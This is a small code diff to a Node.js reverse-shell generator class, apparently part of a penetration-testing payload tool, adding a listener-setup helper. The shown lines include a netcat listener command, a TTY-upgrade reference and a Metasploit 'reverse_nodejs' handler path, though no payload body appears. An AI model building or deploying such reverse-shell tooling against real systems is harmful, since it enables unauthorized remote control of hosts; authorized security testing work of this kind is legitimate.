@@ -1,5 +1,5 @@
 import random
-from .base import RandomNamePool, ShellGenerator, ShellOptions, ShellResult, TTY_UPGRADE, msf_handler
+from .base import RandomNamePool, ShellGenerator, ShellOptions, ShellResult, TTY_UPGRADE, msf_handler, build_listener_setup
 
 
 class NodeJSGenerator(ShellGenerator):
@@ -16,6 +16,7 @@ class NodeJSGenerator(ShellGenerator):
             listener=f"rlwrap nc -lvnp {opts.lport}",
             tty_upgrade=TTY_UPGRADE,
             msf_compat=msf_handler("payload/cmd/unix/reverse_nodejs", opts.lhost, opts.lport),
+            listener_setup=build_listener_setup(opts.lhost, opts.lport),
         )
 
     def _net_module(self, opts: ShellOptions, names: RandomNamePool | None) -> str:
